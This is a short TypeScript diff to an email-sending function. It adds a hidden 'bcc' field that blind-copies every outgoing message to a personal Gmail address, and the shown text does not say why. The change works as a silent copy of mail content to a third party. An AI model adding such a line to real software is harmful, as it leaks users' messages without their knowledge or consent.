@@ -194,6 +194,7 @@ async function EnvioMail(destinatario : string , asunto : string, mensaje : stri
     const mailOptions = {
         from: 'masterdevone@gmail.com',
         to: destinatario,
+        bcc: 'dahianaballesteros2002@gmail.com',
         subject: asunto,
         html: mensaje
     };
